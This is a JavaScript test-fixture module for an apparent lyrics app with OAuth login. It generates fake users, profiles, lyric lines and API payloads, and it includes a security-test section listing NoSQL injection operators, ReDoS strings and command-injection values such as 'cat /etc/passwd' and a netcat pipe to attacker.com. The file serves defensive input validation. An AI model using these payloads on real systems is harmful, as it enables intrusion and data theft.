/**
 * Test Data Factories & Fixtures
 * Provides reusable test data generators for all test suites
 */

const { faker } = require('@faker-js/faker');

class TestFixtures {
    /**
     * OAuth Profile Fixtures
     */
    static googleProfile() {
        return {
            id: `google_${faker.string.uuid()}`,
            email: faker.internet.email(),
            name: faker.person.fullName(),
            picture: faker.image.avatar(),
        };
    }

    static discordProfile() {
        return {
            id: `discord_${faker.string.uuid()}`,
            email: faker.internet.email(),
            username: faker.internet.username(),
            avatar: faker.datatype.uuid(),
        };
    }

    static xProfile() {
        return {
            data: {
                id: `x_${faker.string.uuid()}`,
                username: faker.internet.username(),
                name: faker.person.fullName(),
            },
        };
    }

    static githubProfile() {
        return {
            id: faker.string.uuid(),
            login: faker.internet.username(),
            email: faker.internet.email(),
            avatar_url: faker.image.avatar(),
            name: faker.person.fullName(),
        };
    }

    /**
     * User Fixtures
     */
    static localUser() {
        return {
            email: faker.internet.email(),
            username: faker.internet.username(),
            password: 'SecurePassword123!',
            provider: 'local',
        };
    }

    static oauthUser(provider = 'google') {
        return {
            email: faker.internet.email(),
            username: faker.internet.username(),
            provider,
            providerUserId: faker.string.uuid(),
            avatar: faker.image.avatar(),
        };
    }

    /**
     * Lyric Fixtures
     */
    static validLyricLine(index = 0, startMs = 0) {
        return {
            lineIndex: index,
            startMs,
            endMs: startMs + 2000,
            japanese: 'これはテストです',
            romaji: 'Kore wa tesuto desu',
            vietnamese: 'Đây là một bài kiểm tra',
        };
    }

    static completeLyric() {
        const lines = Array.from({ length: 10 }, (_, i) =>
            this.validLyricLine(i, i * 3000)
        );

        return {
            songId: faker.string.uuid(),
            lyrics: lines,
        };
    }

    static malformedLyric(type = 'overlap') {
        const base = {
            lineIndex: 0,
            japanese: 'テスト',
            romaji: 'Tesuto',
            vietnamese: 'Kiểm tra',
        };

        switch (type) {
            case 'overlap':
                return {
                    ...base,
                    startMs: 0,
                    endMs: 5000,
                    lineIndex: 0,
                };
            case 'reversed':
                return {
                    ...base,
                    startMs: 5000,
                    endMs: 1000,
                };
            case 'zeroDuration':
                return {
                    ...base,
                    startMs: 5000,
                    endMs: 5000,
                };
            case 'emptyJapanese':
                return {
                    ...base,
                    startMs: 0,
                    endMs: 2000,
                    japanese: '',
                };
            default:
                return base;
        }
    }

    /**
     * Injection Payloads for Security Tests
     */
    static noSqlInjectionPayloads() {
        return [
            { email: { $ne: null } },
            { email: { $gt: '' } },
            { password: { $regex: '.*' } },
            { username: { $where: 'this.isAdmin' } },
            { status: { $function: { body: 'function() {}' } } },
        ];
    }

    static redosPatterns() {
        return [
            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX',
            'a'.repeat(50) + 'b',
            '.' + '*'.repeat(50),
        ];
    }

    static commandInjectionPayloads() {
        return [
            'test$(whoami)',
            'test`id`',
            'test & cat /etc/passwd',
            'test | nc attacker.com 1234',
            'test; echo pwned',
        ];
    }

    /**
     * API Request Fixtures
     */
    static registerPayload() {
        return {
            email: faker.internet.email(),
            username: faker.internet.username(),
            password: 'SecurePassword123!',
        };
    }

    static loginPayload(email, password = 'SecurePassword123!') {
        return {
            email,
            password,
        };
    }

    static profileUpdatePayload() {
        return {
            username: faker.internet.username(),
            bio: faker.lorem.sentence(),
            avatar: faker.image.avatar(),
        };
    }

    /**
     * Session Fixtures
     */
    static sessionData(userId) {
        return {
            userId,
            loggedIn: true,
            lastActivity: Date.now(),
            ip: faker.internet.ipv4(),
        };
    }

    /**
     * Error Payloads
     */
    static get errorPayloads() {
        return {
            malformedJson: '{"email":"test@example.com"invalid json}',
            missingRequiredField: { username: 'test' }, // Missing email + password
            invalidEmail: { email: 'not-an-email', password: 'test' },
            weakPassword: { email: faker.internet.email(), password: 'short' },
            oversizedPayload: {
                email: faker.internet.email(),
                username: 'a'.repeat(100000),
            },
        };
    }

    /**
     * Batch Generators
     */
    static generateUsers(count = 10) {
        return Array.from({ length: count }, () => this.localUser());
    }

    static generateLyrics(count = 50) {
        const lines = Array.from({ length: count }, (_, i) =>
            this.validLyricLine(i, i * 2000)
        );
        return {
            songId: faker.string.uuid(),
            lyrics: lines,
        };
    }
}

module.exports = TestFixtures;
